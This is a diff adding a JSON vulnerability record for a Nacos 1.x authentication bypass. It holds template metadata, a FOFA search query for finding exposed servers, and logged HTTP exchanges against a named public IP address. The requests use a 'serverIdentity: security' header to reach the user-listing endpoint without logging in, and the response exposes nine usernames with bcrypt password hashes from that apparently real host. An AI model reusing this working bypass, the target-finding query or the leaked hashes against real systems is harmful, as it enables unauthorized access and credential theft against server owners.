@@ -1,0 +1,41 @@
+{
+    "nacos-auth-bypass": {
+        "info": {
+            "name": "Nacos 1.x - Authentication Bypass",
+            "author": "taielab,pikpikcu,SleepingBag945",
+            "severity": "critical",
+            "description": "Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.\n",
+            "reference": [
+                "https://github.com/alibaba/nacos/issues/4593",
+                "https://nacos.io/en-us/docs/auth.html",
+                "https://zhuanlan.zhihu.com/p/602021283"
+            ],
+            "classification": {
+                "cpe": "cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*"
+            },
+            "metadata": {
+                "verified": true,
+                "max-request": 2,
+                "vendor": "alibaba",
+                "product": "nacos",
+                "fofa-query": "app=\"NACOS\""
+            },
+            "tags": "nacos,auth-bypass"
+        },
+        "targets": [
+            {
+                "target": "http://47.94.1.169:8848",
+                "req_resp": [
+                    {
+                        "req": "GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1\r\nHOST: 47.94.1.169\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nserverIdentity: security\r\n\r\n",
+                        "resp": "HTTP/1.1 200\r\nContent-Type: application/json;charset=UTF-8\r\nTransfer-Encoding: chunked\r\nDate: Fri, 21 Mar 2025 14:30:01 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\n{\"totalCount\":21,\"pageNumber\":1,\"pagesAvailable\":3,\"pageItems\":[{\"username\":\"2oRH5Zu5Re58fqwHUpzx5OlxPxA\",\"password\":\"$2a$10$WNZK2yArnvCGTuT9JRjIieimj.5e6cDKRBGQYrOxdbxx/OOKCDpSC\"},{\"username\":\"2r6BdHQXAemyp7OorVzGNzXrqje\",\"password\":\"$2a$10$l5jdeOsEzFnqSCJN57yvA.UHIDKAwjipfY3u/23cenq8CsA4Ig2nG\"},{\"username\":\"2rNmgPpzjLuxFfr4tqwZstVP6Od\",\"password\":\"$2a$10$DettbQ72z3wqATWIQlB2mez97wsQglFXWRIcvDFbIwB9HbikpjAui\"},{\"username\":\"abc123\",\"password\":\"$2a$10$mcwUNSrf.aYQhdGF3x5kneSupb7u3wz4avhUuqucSiNHOgq0U3FYq\"},{\"username\":\"haidan\",\"password\":\"$2a$10$KNSM2/D6qxSYN8pE1DJpOuFsXk9G9cSXLgNctnTvPqSvUdtj.QyqW\"},{\"username\":\"myworld5483\",\"password\":\"$2a$10$Nu4mym0swnWZAOr1BPYIn.0Bir38nBSJUBcRPfg0Ge9waSswPSS/S\"},{\"username\":\"myworld7990\",\"password\":\"$2a$10$gMAzRBexMSzXI5GlN0JzM.ceHIhTfTb98q3WDL07wRCFNmGxSnY5y\"},{\"username\":\"na\",\"password\":\"$2a$10$dIRfMs8h3dUidnnI47vnuO6xN6smlSM3yeAT1b3pMCvkzJPN7D0OW\"},{\"username\":\"nacos\",\"password\":\"$2a$10$MZw1YgUaj7G5AOOGxbYjjuOQbRBPWhqmi1UGRqEJj3pzipxuz9YlO\"}]}"
+                    },
+                    {
+                        "req": "GET /v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1\r\nHOST: 47.94.1.169\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nserverIdentity: security\r\n\r\n",
+                        "resp": "HTTP/1.1 404\r\nContent-Type: text/html;charset=utf-8\r\nContent-Language: en\r\nContent-Length: 431\r\nDate: Fri, 21 Mar 2025 14:30:01 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\n<!doctype html><html lang=\"en\"><head><title>HTTP Status 404 – Not Found</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1></body></html>"
+                    }
+                ]
+            }
+        ]
+    }
+}
